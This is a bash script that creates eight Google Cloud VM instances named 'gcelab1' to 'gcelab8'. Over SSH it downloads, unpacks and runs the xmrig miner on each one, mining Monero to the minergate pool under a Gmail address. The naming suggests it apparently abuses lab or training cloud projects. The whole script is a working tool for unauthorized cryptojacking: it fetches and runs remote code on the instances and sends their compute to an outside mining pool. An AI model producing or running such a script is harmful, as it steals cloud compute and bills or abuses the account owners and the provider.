#!/bin/bash
ssh-keygen
for a in 1 2 3 4 5 6 7 8 
do

gcloud compute instances create gcelab$a --machine-type n1-standard-2 --zone us-central1-c --image-family=ubuntu-2004-lts --image-project=ubuntu-os-cloud 
done
for a in 1 2 3 4 5 6 7 8 
do

nohup gcloud compute ssh gcelab$a --zone=us-central1-c --ssh-key-file=/home/$USER/.ssh/id_rsa --command='wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz && tar xvzf  xmrig-6.5.3-linux-x64.tar.gz && ./xmrig-6.5.3/xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u site.web97@gmail.com' &
done
